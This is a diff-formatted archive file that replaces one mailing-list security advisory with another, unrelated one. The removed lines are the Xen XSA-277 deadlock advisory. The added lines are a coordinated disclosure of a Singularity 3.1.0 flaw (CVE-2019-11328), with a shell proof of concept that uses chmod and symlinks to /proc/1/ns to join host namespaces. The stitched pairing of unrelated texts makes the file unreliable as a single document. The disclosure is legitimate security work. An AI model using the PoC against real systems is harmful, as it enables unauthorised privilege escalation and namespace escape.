@@ -1,108 +1,160 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/01/08/14
-Message-Id: <E1gguU8-0006Vj-Pi@xenbits.xenproject.org>
-Date: Tue, 08 Jan 2019 16:44:12 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 277 v3 (CVE-2018-19964) - x86: incorrect error handling for guest p2m page removals
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/05/16/1
+Message-ID: <20190516101558.GB21014@f195.suse.de>
+Date: Thu, 16 May 2019 12:15:58 +0200
+From: Matthias Gerstner <mgerstner@...e.de>
+To: oss-security@...ts.openwall.com
+Subject: Singularity 3.1.0: CVE-2019-11328: namespace privilege escalation and arbitrary file corruption
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hello,
 
-            Xen Security Advisory CVE-2018-19964 / XSA-277
-                              version 3
+following is a report about a major security issue found in Singularity
+[1] major version 3.1.
 
-       x86: incorrect error handling for guest p2m page removals
+Introduction
+============
 
-UPDATES IN VERSION 3
-====================
+Singularity is a Linux namespace based container solution often used in
+HPC (high performance computing) environments. In the course of a code
+review conducted for inclusion of the new Singularity major version 3 in
+SUSE enterprise products I found a major security issue.
 
-CVE assigned.
+The issue affects Singularity versions >= 3.1.0 and it has recently been
+fixed in an update to version 3.2.0 [2]. The issue was introduced via
+upstream commit b4dcb0e4d77baa1c7647a4a5705ea824bb4e0dca [3].
 
-ISSUE DESCRIPTION
-=================
+Issue Details
+=============
 
-The internal function querying a domain's p2m table grabs the p2m lock
-by default, so that the answer to the query remains true until the
-caller can act on that information; it is up to the caller then to
-release the lock.  Unfortunately, certain failure paths don't release
-the lock.
+Singularity 3 uses a setuid root program called `starter-suid` for
+setting up Singularity containers. The issue is that containers run as
+background instances get bad directory permissions in path
+`/run/singularity/instances/sing/<user>/<instance>`. The permission of
+these directories is set to "<user>:root" with mode 0550.  Since the
+unprivileged user is the owner of the directory it may change the mode
+to arbitrary values and therefore also the content of the directory to
+arbitrary content.
 
-IMPACT
-======
+A result of this is that symlinks can be placed in the `ns`
+sub-directory that will be followed when joining the container instance
+and thus allow unprivileged users to enter arbitrary mnt, pid, net,
+cgroup, uts and ipc namespaces. Only user namespaces cannot be joined,
+because the `starter-suid` binary refuses to use user namespaces when
+running in the setuid context. (`starter-suid` also contains logic that
+is only intended for use when the program doesn't carry a setuid root
+bit).
 
-A malicious or buggy guest may cause a deadlock, resulting in a DoS
-(Denial of Service) affecting the entire host.
+Furthermore, because the `starter-suid` program trusts the content of
+the JSON config file found in the instance directory, an attacker can
+modify this content to change the behaviour of the `starter-suid`
+program when joining a container. This way all desired namespaces can be
+configured or even the `noNewPrivileges` field can be set to false,
+allowing a user to join the container without the `PR_SET_NO_NEW_PRIVS`
+bit set (see `prctl()`).
 
-VULNERABLE SYSTEMS
-==================
+Even further, during creation of a background instance, the unprivileged
+user can try to win a race condition and place a symlink in path
+`/run/singularity/instances/sing/<user>/<instance>/<instance>.json`. The
+`starter-suid` program will follow this symlink and create and truncate
+an existing file in the target location. This allows to create or
+overwrite arbitrary files in the system with root privileges. The
+content written to the file is only partially attacker controlled,
+because the beginning of the JSON has a fixed structure.
 
-Xen 4.11 and onward are vulnerable.
+I couldn't work out a full local root exploit from these defects yet but
+all of the findings are very close to getting root and if putting in
+enough energy there's probably some way to achieve it. Being able to
+enter arbitary other namespaces is similar in consequences as
+CVE-2018-12021 was for Singularity major version 2.
 
-Only x86 systems are vulnerable.  ARM systems are not vulnerable.
+The issue has been fixed by usptream by moving the instance
+configuration file into the user's home directory, fixing the
+permissions of the directory in /run and not trusting certain parameters
+found in the instance's JSON configuration.
 
-Only systems running untrusted HVM or PVH guests are vulnerable.
-Systems running only PV guests are not vulnerable.
+PoC
+===
 
-MITIGATION
+For completeness here is a couple of lines that show a PoC for joining
+arbitrary ipc, pid and mnt namespaces based on Singularity release
+3.1.1:
+
+```
+user $ singularity pull library://library/default/debian
+[...]
+user $ singularity instance start library://library/default/debian deb
+# this is the normal way of entering the container, becoming a member of
+# the regular container namespaces
+user $ singularity shell instance://deb
+  deb-user $ ls -l /proc/$$/ns
+  lrwxrwxrwx 1 user users 0 Apr 15 15:41 cgroup -> cgroup:[4026531835]
+  lrwxrwxrwx 1 user users 0 Apr 15 15:41 ipc -> ipc:[4026532284]
+  lrwxrwxrwx 1 user users 0 Apr 15 15:41 mnt -> mnt:[4026532285]
+  lrwxrwxrwx 1 user users 0 Apr 15 15:41 net -> net:[4026531992]
+  lrwxrwxrwx 1 user users 0 Apr 15 15:41 pid -> pid:[4026532283]
+  lrwxrwxrwx 1 user users 0 Apr 15 15:41 pid_for_children -> pid:[4026532283]
+  lrwxrwxrwx 1 user users 0 Apr 15 15:41 user -> user:[4026531837]
+  lrwxrwxrwx 1 user users 0 Apr 15 15:41 uts -> uts:[4026531838]
+  deb-user $ exit
+
+# now manipulate the state directory 
+user $ cd /run/singularity/instances/sing/$USER/deb
+user $ ls -lhd .
+dr-xr-x--- 3 user root 80 15. Apr 15:38 .
+user $ chmod u+w .
+user $ rmdir ns
+user $ mkdir ns
+user $ cd ns
+user $ ln -s /proc/1/ns/pid
+user $ ln -s /proc/1/ns/mnt
+user $ ln -s /proc/1/ns/ipc
+# oberserve the changed values for pid, mnt and ipc. Of course joining
+# the root namespaces does not make much sense but it shows the
+# principle of operation
+user $ singularity shell instance://deb
+  deb-user $ ls -l /proc/$$/ns
+  lrwxrwxrwx 1 user users 0 15. Apr 15:43 cgroup -> 'cgroup:[4026531835]'
+  lrwxrwxrwx 1 user users 0 15. Apr 15:43 ipc -> 'ipc:[4026531839]'
+  lrwxrwxrwx 1 user users 0 15. Apr 15:43 mnt -> 'mnt:[4026531840]'
+  lrwxrwxrwx 1 user users 0 15. Apr 15:43 net -> 'net:[4026531992]'
+  lrwxrwxrwx 1 user users 0 15. Apr 15:43 pid -> 'pid:[4026531836]'
+  lrwxrwxrwx 1 user users 0 15. Apr 15:43 pid_for_children -> 'pid:[4026531836]'
+  lrwxrwxrwx 1 user users 0 15. Apr 15:43 user -> 'user:[4026531837]'
+  lrwxrwxrwx 1 user users 0 15. Apr 15:43 uts -> 'uts:[4026531838]'
+```
+
+Timeline
+========
+
+2019-04-15: I reported the finding to security@...abs.io
+2019-04-18: Sylabs confirmed the issue and discussed various patching
+            approaches with me. The process described in [4] has been
+            triggered.
+2019-05-15: The agreed upon coordinated-release-date was reached and
+            Sylabs published the fixed version.
+
+References
 ==========
 
-Running only PV guests will avoid this vulnerability.
+[1]: https://www.sylabs.io
+[2]: https://github.com/sylabs/singularity/releases/tag/v3.2.0
+[3]: https://github.com/sylabs/singularity/commit/b4dcb0e4d77baa1c7647a4a5705ea824bb4e0dca
+[4]: https://www.sylabs.io/singularity/security-policy
 
-CREDITS
-=======
+Regards
 
-This issue was discovered by Paul Durrant of Citrix.
+Matthias
 
-RESOLUTION
-==========
+-- 
+Matthias Gerstner <matthias.gerstner@...e.de>
+Dipl.-Wirtsch.-Inf. (FH), Security Engineer
+https://www.suse.com/security
+Phone: +49 911 740 53 290
+GPG Key ID: 0x14C405C971923553
 
-Applying the appropriate attached patch resolves this issue.
+SUSE Linux GmbH
+GF: Felix Imendörffer, Mary Higgins, Sri Rasiah
+HRB 21284 (AG Nuernberg)
 
-xsa277.patch           xen-unstable, Xen 4.11.x
-
-$ sha256sum xsa277*
-576cdc05975e43698624b88f7290119dd702b3db8f30f3219754d992d7fef0c6  xsa277.meta
-c9025e1daaec4081a61f1ed7b96e69cfe8e35bdd5b4fcc0fadc98f71c2e243e2  xsa277.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
-
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
-
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
-
-iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAlw00y8MHHBncEB4ZW4u
-b3JnAAoJEIP+FMlX6CvZN+YH/2HCZYKrgxQzQIfNMO+2magHgzrlY0YCzmmgSpJD
-StrtQ//XSg4KbBsdRJbMZLPcAhXFRBPWueW+p/Tv2ANyPc95hLh1mrhS8DshbJ4v
-C2istb+FLiGKCuhqKbdxmvR7f73Htu7lcZ10J1EDbtwYufXnsDMfkzLLeHaKDCnV
-Cw0igX3yL2Puj3DhNZg7HrD77wKvkaX2eDNUGsivq/PhnhYD4wuP0Jo6QVO749nI
-ugDBhvavnV3JODFhfS+4g6M8NMwjLMedsmbCv5pGsd4hBj/lb4hgkMXanKy+bRUv
-Te2YiJZ4gwpkVKgpyG0uzIb9xg14uTYfemFE+fVNhO+zUQE=
-=Anj0
------END PGP SIGNATURE-----
-
-Download attachment "xsa277.meta" of type "application/octet-stream" (666 bytes)
-
-Download attachment "xsa277.patch" of type "application/octet-stream" (1835 bytes)
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
